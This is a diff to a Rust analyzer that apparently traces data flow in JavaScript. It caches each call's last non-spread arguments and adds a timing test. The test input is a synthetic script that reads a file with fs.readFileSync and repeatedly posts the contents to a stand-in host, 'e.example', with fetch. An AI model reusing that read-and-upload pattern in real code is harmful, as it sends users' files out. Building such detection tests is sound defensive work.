@@ -141,6 +141,9 @@ struct Flow<'s, 'a> {
     /// [`Flow::api`] reads it.
     destructured: HashMap<SymbolId, &'a str>,
     objects: RefCell<HashMap<usize, Rc<ObjectFields>>>,
+    /// Positions of each call's last two arguments that aren't spreads,
+    /// by the call's address. Finding them skips every trailing spread.
+    last_arguments: RefCell<HashMap<usize, [Option<usize>; 2]>>,
 }
 
 /// The properties [`Flow::field`] and [`Flow::value`] read of an object
@@ -204,6 +207,29 @@ impl<'s, 'a> Flow<'s, 'a> {
                 .entry(address)
                 .or_insert_with(|| Rc::new(ObjectFields::new(object))),
         )
+    }
+
+    /// The call's last two arguments that aren't spreads, the last first.
+    fn last_two_arguments<'e>(
+        &self,
+        call: &'e CallExpression<'a>,
+    ) -> [Option<&'e Expression<'a>>; 2] {
+        let address = std::ptr::from_ref(call).addr();
+        let positions = *self
+            .last_arguments
+            .borrow_mut()
+            .entry(address)
+            .or_insert_with(|| {
+                let mut positions = call
+                    .arguments
+                    .iter()
+                    .enumerate()
+                    .rev()
+                    .filter(|(_, argument)| argument.as_expression().is_some())
+                    .map(|(position, _)| position);
+                [positions.next(), positions.next()]
+            });
+        positions.map(|position| position.and_then(|p| call.arguments[p].as_expression()))
     }
 
     fn symbol(&self, identifier: &IdentifierReference<'_>) -> Option<SymbolId> {
@@ -638,6 +664,7 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
         over_budget: false,
         destructured: destructured_methods(semantic),
         objects: RefCell::new(HashMap::new()),
+        last_arguments: RefCell::new(HashMap::new()),
         written: semantic
             .scoping()
             .symbol_ids()
@@ -1104,6 +1131,24 @@ mod tests {
             .iter()
             .map(|source| "eval(a);".repeat(source.len() / 8 + 1))
             .collect();
+        let repeated_time = time_to_analyze(&repeated);
+        let flat_time = time_to_analyze(&side_by_side);
+        assert!(
+            repeated_time < flat_time * 5,
+            "repeated {repeated_time:?}, side by side {flat_time:?}"
+        );
+    }
+
+    #[test]
+    fn a_path_built_from_many_spreads_is_read_once_per_call() {
+        // Each upload follows the path to its `path.join` call, whose last
+        // arguments were found by skipping every trailing spread again.
+        let spreads = "...x,".repeat(20_000);
+        let uploads = "fetch('https://e.example',{body:data});".repeat(20_000);
+        let repeated = [format!(
+            "const fs=require('fs'),path=require('path');const p=path.join('a','b',{spreads});const data=fs.readFileSync(p);{uploads}"
+        )];
+        let side_by_side = ["eval(a);".repeat(repeated[0].len() / 8 + 1)];
         let repeated_time = time_to_analyze(&repeated);
         let flat_time = time_to_analyze(&side_by_side);
         assert!(
